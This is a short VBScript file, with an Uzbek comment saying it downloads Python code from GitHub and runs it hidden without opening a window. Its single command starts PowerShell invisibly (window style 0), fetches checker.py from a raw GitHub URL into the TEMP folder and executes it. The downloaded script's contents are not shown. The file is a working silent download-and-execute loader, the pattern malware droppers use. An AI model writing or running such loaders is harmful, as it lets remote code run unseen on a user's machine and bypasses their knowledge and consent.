' Bu oyna ochmasdan GitHub-dan Python kodini yuklab oladi va yashirin ishga tushiradi
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ishmuratovazizi-afk/checker-bot/main/checker.py' -OutFile $env:TEMP\checker.py ; py $env:TEMP\checker.py""", 0, False
